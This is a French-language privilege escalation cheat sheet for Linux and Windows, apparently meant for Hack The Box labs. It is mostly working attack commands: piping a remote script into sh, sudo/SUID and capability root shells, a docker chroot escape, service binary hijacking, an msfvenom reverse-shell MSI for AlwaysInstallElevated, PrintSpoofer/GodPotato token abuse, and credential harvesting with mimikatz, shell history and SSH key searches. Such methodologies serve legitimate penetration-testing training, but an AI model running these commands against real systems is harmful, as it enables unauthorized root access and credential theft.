Voici la méthodologie complète de privesc, organisée par étapes, pour Linux et Windows.

# LINUX — Privilege Escalation

## Étape 1 : Énumération automatisée (toujours en premier)

```bash
# LinPEAS - le plus complet, à privilégier en premier
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# ou upload puis exécution locale
./linpeas.sh -a > linpeas_output.txt
```

Alternatives : `linux-smart-enumeration` (lse.sh), `Linux Exploit Suggester` (`les.sh`) pour croiser avec les CVE kernel connues.

## Étape 2 : Vecteurs classiques à vérifier manuellement

**Sudo rights (`sudo -l`) — le premier réflexe :**
```bash
sudo -l
```
Si un binaire autorisé sans mot de passe figure dans [GTFOBins](https://gtfobins.github.io/), exploitation immédiate :
```bash
# Exemple avec find
sudo find . -exec /bin/sh \; -quit
```

**Binaires SUID :**
```bash
find / -perm -4000 -type f 2>/dev/null
```
Croiser chaque résultat avec GTFOBins pour voir s'il permet un escape.

**Capabilities Linux (souvent oublié) :**
```bash
getcap -r / 2>/dev/null
```
Exemple exploitable : `python3` avec `cap_setuid+ep` → 
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Cron jobs mal protégés :**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l
```
Si un script lancé par root est modifiable par toi → injection de commande.

**Fichiers avec droits d'écriture anormaux :**
```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

**PATH hijacking :**
```bash
echo $PATH
# Si un script root appelle une commande sans chemin absolu et que tu peux écrire dans un dossier du PATH placé avant le vrai binaire
```

**Kernel exploits (dernier recours si rien d'autre ne marche) :**
```bash
uname -a
# Croiser la version avec searchsploit
searchsploit linux kernel <version>
```

**Mots de passe / clés en dur :**
```bash
grep -r "password" /etc/ 2>/dev/null
find / -name "*.bak" -o -name "*.old" 2>/dev/null
cat ~/.bash_history
find / -name "id_rsa*" 2>/dev/null
```

**NFS mal configuré (`no_root_squash`) :**
```bash
cat /etc/exports
```

**Docker/LXD group membership (escape direct vers root) :**
```bash
id
# Si dans le groupe docker :
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Étape 3 : Confirmation root

```bash
whoami
id
cat /root/root.txt   # spécifique HTB
```

---

# WINDOWS — Privilege Escalation

## Étape 1 : Énumération automatisée

```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp (PowerShell)
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

Ou **Seatbelt** pour un audit ciblé, et **SharpUp** en équivalent C# de PowerUp.

## Étape 2 : Vecteurs classiques à vérifier manuellement

**Privilèges du token courant (le plus important à checker en premier) :**
```powershell
whoami /priv
```
Cherche particulièrement : `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`.

**Si `SeImpersonatePrivilege` présent → PrintSpoofer / JuicyPotato / GodPotato (très fréquent sur HTB, comptes de service IIS/MSSQL) :**
```powershell
.\PrintSpoofer64.exe -i -c cmd
```
ou
```powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

**Services mal configurés (permissions faibles sur le binaire ou le service lui-même) :**
```powershell
# Lister les services et leurs permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```
Si le service tourne en SYSTEM et que tu peux remplacer son binaire :
```cmd
sc config <service_name> binpath= "C:\path\evil.exe"
sc stop <service_name>
sc start <service_name>
```

**Unquoted Service Path :**
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**AlwaysInstallElevated (MSI en SYSTEM) :**
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Si les deux sont à `1` :
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi
```
```cmd
msiexec /quiet /qn /i evil.msi
```

**Mots de passe en dur (fichiers config, registre, PowerShell history) :**
```powershell
findstr /si password *.txt *.xml *.ini *.config
Get-Content (Get-PSReadlineOption).HistorySavePath
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s   # sessions PuTTY sauvegardées
```

**Tâches planifiées modifiables :**
```powershell
schtasks /query /fo LIST /v
```

**DLL Hijacking** (Procmon pour identifier les DLL manquantes chargées par un processus privilégié).

**Credentials en mémoire / tickets Kerberos (post-exploitation locale) :**
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

**Stored credentials Windows (Credential Manager) :**
```cmd
cmdkey /list
runas /savecred /user:<user> cmd.exe
```

## Étape 3 : Confirmation SYSTEM/Admin

```powershell
whoami
type C:\Users\Administrator\Desktop\root.txt   # spécifique HTB
```

---

# Méthodologie générale (Linux ET Windows)

1. **Énumération automatique d'abord** (LinPEAS/WinPEAS) — gain de temps énorme, repère 90% des vecteurs classiques.
2. **Vérifier les privilèges/droits actuels** (`sudo -l` / `whoami /priv`) — souvent la voie la plus directe.
3. **Chercher les credentials en dur** (fichiers config, historique, backups) — très fréquent sur HTB.
4. **Vérifier les services/tâches tournant avec un compte privilégié** et si tu peux les détourner.
5. **En dernier recours seulement** : kernel exploits / CVE spécifiques — risqué (crash possible), à tester après avoir épuisé le reste.

